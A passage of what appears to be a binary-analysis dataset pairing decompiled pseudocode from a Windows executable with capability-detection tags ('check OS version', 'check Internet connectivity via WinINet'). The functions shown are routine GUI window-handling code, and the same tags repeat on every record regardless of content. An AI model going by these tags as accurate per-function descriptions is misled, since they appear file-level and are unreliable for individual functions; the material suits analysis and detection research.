return;\n}\n",
        "token_count": 347
    },
    "00457174": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00457174(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack68;\n    uint uStack64;\n    uchar *puStack60;\n    uint uStack56;\n    uint uStack52;\n    uint *puStack48;\n    uint uStack44;\n    uint var_18h;\n    uint uStack24;\n    uint uStack20;\n    uint uStack16;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    if (*(param_2 + 0xc) == 0) {\n        iVar1 = *(param_2 + 4);\n        var_18h = *(iVar1 + 0x4c);\n        uStack24 = *(iVar1 + 0x50);\n        uStack20 = *(iVar1 + 0x54);\n        uStack16 = *(iVar1 + 0x58);\n        uStack44 = 2;\n        puStack48 = &fcn.00457174::var_18h;\n        uStack52 = 0x4571ae;\n        var_8h = param_2;\n        var_4h = in_EAX;\n        uStack52 = fcn.00458594();\n        uStack56 = 0;\n        puStack60 = 0x4571b6;\n        sub.user32.dll_MapWindowPoints();\n        puStack60 = 0x4571be;\n        fcn.004541a0();\n        uStack64 = 0x457237;\n        uStack68 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffbc;\n        puStack60 = &stack0xfffffffc;\n        fcn.0040484c();\n        if ((*(var_4h + 0x1db) != '\\0') && (*(var_4h + 0x1b0) != 0)) {\n            (**(**(var_4h + 0x1b0) + 0x18))(*(*(var_8h + 4) + 0x60));\n        }\n        *in_FS_OFFSET = uStack68;\n        puStack60 = 0x45723e;\n        uStack64 = 0x457236;\n        fcn.004541a8();\n        return;\n    }\n    return;\n}\n",
        "token_count": 521
    },
    "00457264": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00457264(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    \n    *(param_2 + 0xc) = 0;\n    if ((*(in_EAX + 0x1db) != '\\0') && (*(in_EAX + 0x1b0) != 0)) {\n        (**(**(in_EAX + 0x1b0) + 0x28))();\n    }\n    return;\n}\n",
        "token_count": 110
    },
    "0045728c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0045728c(void)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = 0x4572a1;\n    iVar2 = (**(*in_EAX + 0x58))();\n    puStack24 = 0x4572ab;\n    iVar3 = fcn.00404528();\n    if (iVar2 == iVar3) {\n        cVar1 = *(in_EAX + 0x57);\n        uStack28 = 0x4572f7;\n        uStack32 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffe0;\n        puStack24 = &stack0xfffffffc;\n        fcn.0040484c();\n        *in_FS_OFFSET = uStack32;\n        puStack24 = 0x457308;\n        if (cVar1 != '\\0') {\n            uStack28 = 0x4572f6;\n            fcn.00450a94();\n        }\n        return;\n    }\n    puStack24 = 0x457308;\n    fcn.00452d48();\n    return;\n}\n",
        "token_count": 293
    },
    "0045733c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong __fastcall fcn.0045733c(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    uchar uVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    uint unaff_EBX;\n    uint uVar4;\n    int32_t iStack20;\n    \n    uVar4 = CONCAT31(unaff_EBX >> 8, 1);\n    iVar3 = fcn.0043bd2c();\n    if ((iVar3 != 0) && (in_EAX != iVar3)) {\n        if (*(iVar3 + 0x275) != '\\0') {\n            cVar1 = fcn.0045733c();\n            if (cVar1 != '\\0') goto code_r0x004573da;\n        }\n        if (*(iVar3 + 0x30) != 0) {\n            iStack20 = fcn.0043bd2c();\n            if (((iStack20 != 0) && (iVar3 != iStack20)) && (*(iStack20 + 0x275) != '\\0')) {\n                cVar1 = fcn.0045733c();\n                if (cVar1 != '\\0') goto code_r0x004573da;\n            }\n        }\n    }\n    uVar2 = fcn.0043bbec();\n    if ((*(in_EAX + 0x51) & 0x10) == 0) {\n        fcn.0040484c(uVar2);\n        if (*(param_2 + 4) == 0) goto code_r0x004573da;\n    }\n    uVar4 = 0;\ncode_r0x004573da:\n    return CONCAT44(iStack20, uVar4);\n}\n",
        "token_count": 379
    },
    "00457468": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong __fastcall fcn.00457468(uint32_t param_1, int32_t param_2)\n\n{\n    char cVar1;\n    uint8_t uVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    uint unaff_EBX;\n    uint uVar4;\n    uint32_t uStack20;\n    \n    uVar4 = CONCAT31(unaff_EBX >> 8, 1);\n    iVar3 = fcn.0043bd2c();\n    if (((iVar3 != 0) && (in_EAX != iVar3)) && (*(iVar3 + 0x275) != '\\0')) {\n        cVar1 = fcn.00457468();\n        uStack20 = param_1;\n        if (cVar1 != '\\0') goto code_r0x004574c8;\n    }\n    uVar2 = fcn.0043bbec();\n    uStack20 = param_1 & 0xffffff00 | uVar2;\n    if ((*(in_EAX + 0x51) & 0x10) == 0) {\n        fcn.0040484c();\n        if (*(param_2 + 4) == 0) goto code_r0x004574c8;\n    }\n    uVar4 = 0;\ncode_r0x004574c8:\n    return CONCAT44(uStack20, uVar4);\n}\n",
        "token_count": 303
    },
    "00457530": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong __fastcall fcn.00457530(uint32_t param_1, int32_t param_2)\n\n{\n    uint8_t uVar1;\n    char cVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    uint unaff_EBX;\n    uint uVar4;\n    uint32_t uStack20;\n    \n    uVar4 = CONCAT31(unaff_EBX >> 8, 1);\n    iVar3 = fcn.0043bd2c();\n    uStack20 = param_1;\n    if (((iVar3 != 0) && (in_EAX != iVar3)) && (*(iVar3 + 0x275) != '\\0')) {\n        cVar2 = fcn.00457530();\n        if (cVar2 != '\\0') goto code_r0x0045758e;\n    }\n    if ((*(in_EAX + 0x51) & 0x10) == 0) {\n        uVar1 = *(param_2 + 4);\n        uStack20 = param_1 & 0xffffff00 | uVar1;\n        fcn.0040484c();\n        *(param_2 + 4) = uVar1;\n        if (*(param_2 + 4) == '\\0') goto code_r0x0045758e;\n    }\n    uVar4 = 0;\ncode_r0x0045758e:\n    return CONCAT44(uStack20, uVar4);\n}\n",
        "token_count": 317
    },
    "00457788": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00457788(void)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    \n    if (in_EAX[0x19] == 0) {\n        iVar1 = fcn.004507a0();\n        if (iVar1 < 1) {\n            iVar1 = fcn.0040aae4();\n            in_EAX[0x19] = iVar1;\n        }\n        else {\n            iVar1 = fcn.0040aac4();\n            in_EAX[0x19] = iVar1;\n            fcn.0040aad8();\n            fcn.004507b0();\n        }\n    }\n    (**(*in_EAX + -0x10))();\n    fcn.004598cc();\n    return;\n}\n",
        "token_count": 169
    },
    "00457808": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00457808(uint param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    \n    if (((*(in_EAX + 7) & 0x10) != 0) && (in_EAX[0xc] != 0)) {\n        *(param_2 + 0xc) = 1;\n        return;\n    }\n    (**(*in_EAX + -0x10))();\n    return;\n}\n",
        "token_count": 104
    },
    "0045782c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint64_t __fastcall fcn.0045782c(uint param_1, uint8_t param_2)\n\n{\n    uint8_t uVar1;\n    int32_t in_EAX;\n    uint32_t uVar2;\n    int32_t iVar3;\n    \n    uVar2 = fcn.0044f89c();\n    if (*(in_EAX + 0x57) != '\\0') {\n        iVar3 = fcn.00454684();\n        iVar3 = iVar3 + -1;\n        if (-1 < iVar3) {\n            do {\n                if ((param_2 & uVar2) != 0) break;\n                fcn.00454648();\n                uVar1 = fcn.0040484c();\n                uVar2 = uVar2 & 0xffffff00 | uVar2 | uVar1;\n                iVar3 = iVar3 + -1;\n            } while (iVar3 != -1);\n        }\n    }\n    return CONCAT14(param_2, uVar2);\n}\n",
        "token_count": 219
    },
    "004578e0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004578e0(uint param_1, int32_t param_2)\n\n{\n    fcn.00452b00();\n    if ((*(*0x495d2c + 0xd) != '\\0') && (*(param_2 + 4) == 0)) {\n        fcn.00454f8c();\n    }\n    fcn.00454714();\n    return;\n}\n",
        "token_count": 90
    },
    "004579f8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004579f8(void)\n\n{\n    int32_t in_EAX;\n    \n    if ((*(in_EAX + 0x57) == '\\0') && (*(in_EAX + 0x30) != 0)) {\n        fcn.00454400();\n    }\n    if (((*(in_EAX + 0x1c) & 0x10) == 0) || ((*(in_EAX + 0x51) & 4) != 0)) {\n        fcn.00455154();\n    }\n    return;\n}\n",
        "token_count": 123
    },
    "00457b7c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00457b7c(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    \n    if (((*(in_EAX + 0x50) & 0x10) != 0) && (*(in_EAX + 0x30) != 0)) {\n        cVar1 = fcn.004588a0();\n        if (cVar1 != '\\0') {\n            iVar2 = sub.user32.dll_IsWindowVisible(*(in_EAX + 0x1b4));\n            if (iVar2 != 0) {\n                fcn.00458498();\n            }\n        }\n    }\n    fcn.00454714();\n    return;\n}\n",
        "token_count": 157
    },
    "00457cc0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint64_t fcn.00457cc0(void)\n\n{\n    uint32_t uVar1;\n    char cVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    uint uStack20;\n    \n    uVar1 = uStack20;\n    uStack20 = CONCAT31(uStack20._1_3_, 1);\n    if ((*(in_EAX + 0x1c) & 0x10) == 0) {\n        if (in_EAX != 0) {\n            do {\n                iVar3 = fcn.0040484c();\n                if ((iVar3 != 0) && (*(iVar3 + 0x38) != 0)) {\n                    cVar2 = fcn.0040484c();\n                    if (cVar2 != '\\0') goto code_r0x00457d4b;\n                }\n                in_EAX = *(in_EAX + 0x30);\n            } while (in_EAX != 0);\n        }\n        iVar3 = fcn.0043bd2c();\n        if (iVar3 != 0) {\n            cVar2 = fcn.0040484c();\n            if (cVar2 != '\\0') goto code_r0x00457d4b;\n        }\n    }\n    iVar3 = fcn.0044d31c();\n    if (iVar3 == 0) {\n        uStack20 = uVar1 & 0xffffff00;\n    }\ncode_r0x00457d4b:\n    return CONCAT44(uStack20, uStack20) & 0xffffffff000000ff;\n}\n",
        "token_count": 357
    },
    "00458140": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00458140(uint param_1, int32_t param_2)\n\n{\n    bool bVar1;\n    char cVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iStack32;\n    \n    iVar4 = *(in_EAX + 0x1b4);\n    if ((iVar4 == 0) || (iVar3 = sub.user32.dll_IsWindowVisible(),  iStack32 = iVar4,  iVar3 == 0)) {\n        bVar1 = false;\n    }\n    else {\n        bVar1 = true;\n    }\n    if (bVar1) {\n        sub.user32.dll_ScrollWindow(*(in_EAX + 0x1b4), iStack32, param_2, 0, 0);\n    }\n    iVar4 = fcn.00454684();\n    if (-1 < iVar4 + -1) {\n        do {\n            iVar3 = fcn.00454648();\n            cVar2 = fcn.004047dc();\n            if ((cVar2 == '\\0') || (*(iVar3 + 0x1b4) == 0)) {\n                *(iVar3 + 0x40) = *(iVar3 + 0x40) + iStack32;\n                *(iVar3 + 0x44) = *(iVar3 + 0x44) + param_2;\n            }\n            else if (!bVar1) {\n                iStack32 = *(iVar3 + 0x1b4);\n                sub.user32.dll_SetWindowPos();\n            }\n            iVar4 = iVar4 + -1;\n        } while (iVar4 != 0);\n    }\n    fcn.004541c8();\n    return;\n}\n",
        "token_count": 384
    },
    "00458230": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00458230(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint uVar3;\n    \n    if (*(in_EAX + 0x30) != 0) {\n        iVar2 = *(*(in_EAX + 0x30) + 0x1cc);\n        if (iVar2 != 0) {\n            param_2 = param_2 - *(iVar2 + 8);\n        }\n        iVar2 = fcn.00419910();\n        if (-1 < iVar2) {\n            iVar1 = *(*(*(in_EAX + 0x30) + 0x1d0) + 8);\n            if (param_2 < 0) {\n                param_2 = 0;\n            }\n            if (iVar1 <= param_2) {\n                param_2 = iVar1 + -1;\n            }\n            if (iVar2 != param_2) {\n                fcn.004197a8();\n                fcn.00419930();\n            }\n        }\n        if (*(in_EAX + 0x1b4) != 0) {\n            if (param_2 == 0) {\n                uVar3 = 1;\n            }\n            else if (param_2 == *(*(*(in_EAX + 0x30) + 0x1d0) + 8) + -1) {\n                uVar3 = 0;\n            }\n            else if (iVar2 < param_2) {\n                fcn.004198b4();\n                uVar3 = fcn.00458594();\n            }\n            else {\n                if (iVar2 <= param_2) {\n                    return;\n                }\n                fcn.004198b4();\n                uVar3 = fcn.00458594();\n            }\n            sub.user32.dll_SetWindowPos(*(in_EAX + 0x1b4), uVar3, 0, 0, 0, 0, 3);\n        }\n    }\n    return;\n}\n",
        "token_count": 453
    },
    "00458570": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00458570(void)\n\n{\n    int32_t *in_EAX;\n    \n    if (in_EAX[0x6d] == 0) {\n        if (in_EAX[0xc] != 0) {\n            fcn.00458570();\n        }\n        (**(*in_EAX + 0x98))();\n    }\n    return;\n}\n",
        "token_count": 82
    },
    "004588a0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t fcn.004588a0(void)\n\n{\n    uint32_t in_EAX;\n    \n    return in_EAX & 0xffffff00 | *(in_EAX + 0x1b4) != 0;\n}\n",
        "token_count": 51
    },
    "004589c4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004589c4(uint arg_8h, uint arg_ch)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    char in_CL;\n    int32_t iVar4;\n    uint *in_FS_OFFSET;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint var_5h;\n    \n    var_ch = 0;\n    puStack40 = 0x4589e6;\n    iVar2 = fcn.00404620();\n    uStack44 = 0x458aba;\n    uStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    puStack40 = &stack0xfffffffc;\n    fcn.0040484c();\n    if (0 < *(iVar2 + 8)) {\n        var_10h = fcn.00419910();\n        iVar4 = var_10h;\n        if (var_10h == -1) {\n            if (in_CL == '\\0') {\n                var_10h = 0;\n                iVar4 = var_10h;\n            }\n            else {\n                var_10h = *(iVar2 + 8) + -1;\n                iVar4 = var_10h;\n            }\n        }\n        do {\n            if (in_CL == '\\0') {\n                if (iVar4 == 0) {\n                    iVar4 = *(iVar2 + 8);\n                }\n                iVar4 = iVar4 + -1;\n            }\n            else {\n                iVar4 = iVar4 + 1;\n                if (iVar4 == *(iVar2 + 8)) {\n                    iVar4 = 0;\n                }\n            }\n            iVar3 = fcn.004198b4();\n            cVar1 = fcn.0040484c();\n            if (((cVar1 != '\\0') && ((arg_ch == '\\0' || (*(iVar3 + 0x1d8) != '\\0')))) &&\n               ((arg_8h == '\\0' || (*(iVar3 + 0x30) == in_EAX)))) {\n                var_ch = iVar3;\n            }\n        } while ((var_ch == 0) && (iVar4 != var_10h));\n    }\n    *in_FS_OFFSET = uStack48;\n    puStack40 = 0x458ac1;\n    uStack44 = 0x458ab9;\n    fcn.00404650();\n    return;\n}\n",
        "token_count": 564
    },
    "00458b8c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00458b8c(int32_t *arg_8h, int32_t *arg_ch)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    int32_t *in_ECX;\n    int32_t *in_EDX;\n    \n    iVar1 = in_EAX[0x1d];\n    if (*(iVar1 + 0x14) == 0) {\n        *in_EDX = 0;\n    }\n    else {\n        *in_EDX = *(in_EAX[0x1d] + 0x14);\n    }\n    if (*(iVar1 + 0x10) == 0) {\n        *in_ECX = 0;\n    }\n    else {\n        *in_ECX = *(in_EAX[0x1d] + 0x10);\n    }\n    if (*(iVar1 + 0xc) == 0) {\n        *arg_ch = 0;\n    }\n    else {\n        *arg_ch = *(in_EAX[0x1d] + 0xc);\n    }\n    if (*(iVar1 + 8) == 0) {\n        *arg_8h = 0;\n    }\n    else {\n        *arg_8h = *(in_EAX[0x1d] + 8);\n    }\n    if ((*(in_EAX + 0x52) & 0x10) != 0) {\n        iVar1 = *(in_EAX[0x1e] + 8) + *(in_EAX[0x1e] + 0x10);\n        if (0 < *in_EDX) {\n            *in_EDX = *in_EDX + iVar1;\n        }\n        if (iVar1 <= *arg_ch) {\n            *arg_ch = *arg_ch - iVar1;\n        }\n        iVar1 = *(in_EAX[0x1e] + 0xc) + *(in_EAX[0x1e] + 0x14);\n        if (0 < *in_ECX) {\n            *in_ECX = *in_ECX + iVar1;\n        }\n        if (iVar1 <= *arg_8h) {\n            *arg_8h = *arg_8h - iVar1;\n        }\n    }\n    (**(*in_EAX + 0x38))(arg_8h, arg_ch);\n    return;\n}\n",
        "token_count": 518
    },
    "00458c50": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00458c50(int32_t *arg_8h, int32_t *arg_ch)\n\n{\n    char cVar1;\n    uint8_t uVar2;\n    int32_t *in_EAX;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t *in_EDX;\n    int32_t *in_FS_OFFSET;\n    uint *arg_8h_00;\n    int32_t lprc;\n    int32_t var_5ah;\n    int32_t var_56h;\n    int32_t var_52h;\n    char var_4eh;\n    char var_4dh;\n    int32_t var_4ch;\n    int32_t var_48h;\n    int32_t var_44h;\n    int32_t var_40h;\n    int32_t var_3ch;\n    int32_t var_38h;\n    int32_t var_34h;\n    int32_t var_30h;\n    int32_t var_2ch;\n    int32_t var_28h;\n    int32_t var_24h;\n    int32_t var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t *var_8h;\n    int32_t *var_4h;\n    \n    var_4h = in_EDX;\n    cVar1 = fcn.004588a0();\n    if ((cVar1 != '\\0') && (iVar3 = fcn.00454684(),  iVar3 != 0)) {\n        (**(*in_EAX + 0x44))();\n        (**(*in_EAX + 0x90))();\n        iVar3 = sub.user32.dll_IsRectEmpty();\n        if (iVar3 == 0) {\n            var_ch = (**(*in_EAX[0x1e] + 0x10))();\n            var_ch = var_ch - (var_56h - lprc);\n            var_10h = (**(*in_EAX[0x1e] + 0x10))();\n            var_10h = var_10h - (var_52h - var_5ah);\n            var_14h = (**(*in_EAX[0x1e] + 0x10))();\n            var_14h = var_14h - (var_56h - lprc);\n            var_18h = (**(*in_EAX[0x1e] + 0x10))();\n            var_18h = var_18h - (var_52h - var_5ah);\n            if (0 < *var_4h) {\n                *var_4h = *var_4h - var_ch;\n            }\n            if (0 < *var_8h) {\n                *var_8h = *var_8h - var_10h;\n            }\n            if (0 < *arg_ch) {\n                *arg_ch = *arg_ch - var_14h;\n            }\n            if (0 < *arg_8h) {\n                *arg_8h = *arg_8h - var_18h;\n            }\n            arg_8h_00 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xffffff80;\n            var_20h = 0;\n            var_30h = 0;\n            var_24h = 0;\n            var_34h = 0;\n            var_28h = 0;\n            var_38h = 0;\n            var_2ch = 0;\n            var_3ch = 0;\n            iVar3 = fcn.00454684();\n            if (-1 < iVar3 + -1) {\n                var_1ch = 0;\n                do {\n                    iVar4 = fcn.00454648();\n                    if ((*(iVar4 + 0x57) != '\\0') || (((*(iVar4 + 0x1c) & 0x10) != 0 && ((*(iVar4 + 0x51) & 4) == 0))))\n                    {\n                        arg_8h_00 = &var_4ch;\n                        fcn.00458b8c(arg_8h_00, &var_44h);\n                        cVar1 = *(iVar4 + 0x5b);\n                        if (cVar1 == '\\0') {\n                            if (*0x4590d4 == (*(iVar4 + 0x61) & *0x4590d4)) {\n                                var_4dh = '\\x01';\n                                if (0 < var_40h) {\n                                    iVar5 = (**(**(iVar4 + 0x78) + 0x10))();\n                                    var_40h = ((var_56h - lprc) - iVar5) - var_40h;\n                                }\n                                if (0 < var_44h) {\n                                    iVar5 = (**(**(iVar4 + 0x78) + 0x10))();\n                                    var_44h = ((var_56h - lprc) + var_44h) - iVar5;\n                                }\n                            }\n                            else {\n                                var_4dh = '\\0';\n                            }\n                        }\n                        else if (cVar1 - 1U < 2) {\n                            var_4dh = '\\x01';\n                        }\n                        else if (cVar1 == '\\x05') {\n                            var_4dh = '\\x02';\n                        }\n                        else {\n                            var_4dh = '\\x03';\n                        }\n                        if (*(iVar4 + 0x5b) == '\\0') {\n                            if (*0x4590d8 == (*(iVar4 + 0x61) & *0x4590d8)) {\n                                var_4eh = '\\x01';\n                                if (0 < var_48h) {\n                                    iVar5 = (**(**(iVar4 + 0x78) + 0x10))();\n                                    var_48h = ((var_52h - var_5ah) - iVar5) - var_48h;\n                                }\n                                if (0 < var_4ch) {\n                                    iVar5 = (**(**(iVar4 + 0x78) + 0x10))();\n                                    var_4ch = ((var_52h - var_5ah) + var_4ch) - iVar5;\n                                }\n                            }\n                            else {\n                                var_4eh = '\\0';\n                            }\n                        }\n                        else {\n                            uVar2 = *(iVar4 + 0x5b) - 3;\n                            if (uVar2 < 2) {\n                                var_4eh = '\\x01';\n                            }\n                            else if (uVar2 == 2) {\n                                var_4eh = '\\x02';\n                            }\n                            else {\n                                var_4eh = '\\x03';\n                            }\n                        }\n                        if (var_4dh - 1U < 2) {\n                            if (((0 < var_40h) && (*var_4h < var_40h)) && (*var_4h = var_40h,  var_20h < *var_4h)) {\n                                var_20h = *var_4h;\n                            }\n                            if (((0 < var_44h) && (var_44h < *arg_ch)) && (*arg_ch = var_44h,  var_24h < *arg_ch)) {\n                                var_24h = *arg_ch;\n                            }\n                        }\n                        else if (var_4dh == '\\x03') {\n                            iVar5 = (**(**(iVar4 + 0x78) + 0x10))();\n                            var_30h = var_30h + iVar5;\n                            iVar5 = (**(**(iVar4 + 0x78) + 0x10))();\n                            var_34h = var_34h + iVar5;\n                        }\n                        if (var_4eh - 1U < 2) {\n                            if (((0 < var_48h) && (*var_8h < var_48h)) && (*var_8h = var_48h,  var_28h < *var_8h)) {\n                                var_28h = *var_8h;\n                            }\n                            if (((0 < var_4ch) && (var_4ch < *arg_8h)) && (*arg_8h = var_4ch,  var_2ch < *arg_8h)) {\n                                var_2ch = *arg_8h;\n                            }\n                        }\n                        else if (var_4eh - 1U == 2) {\n                            iVar5 = (**(**(iVar4 + 0x78) + 0x10))();\n                            var_38h = var_38h + iVar5;\n                            iVar4 = (**(**(iVar4 + 0x78) + 0x10))();\n                            var_3ch = var_3ch + iVar4;\n                        }\n                    }\n                    var_1ch = var_1ch + 1;\n                    iVar3 = iVar3 + -1;\n                } while (iVar3 != 0);\n            }\n            if ((0 < var_20h) && (*var_4h < var_20h + var_30h)) {\n                *var_4h = var_20h + var_30h;\n            }\n            if ((0 < var_24h) && ((*arg_ch == 0 || (*arg_ch < var_24h + var_34h)))) {\n                *arg_ch = var_24h + var_34h;\n            }\n            if ((0 < var_28h) && (*var_8h < var_28h + var_38h)) {\n                *var_8h = var_28h + var_38h;\n            }\n            if ((0 < var_2ch) && ((*arg_8h == 0 || (*arg_8h < var_2ch + var_3ch)))) {\n                *arg_8h = var_2ch + var_3ch;\n            }\n            *in_FS_OFFSET = arg_8h_00;\n            if (0 < *var_4h) {\n                *var_4h = *var_4h + var_ch;\n            }\n            if (0 < *var_8h) {\n                *var_8h = *var_8h + var_10h;\n            }\n            if (0 < *arg_ch) {\n                *arg_ch = *arg_ch + var_14h;\n            }\n            if (0 < *arg_8h) {\n                *arg_8h = *arg_8h + var_18h;\n            }\n            return;\n        }\n    }\n    return;\n}\n",
        "token_count": 2347
    },
    "00459190": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
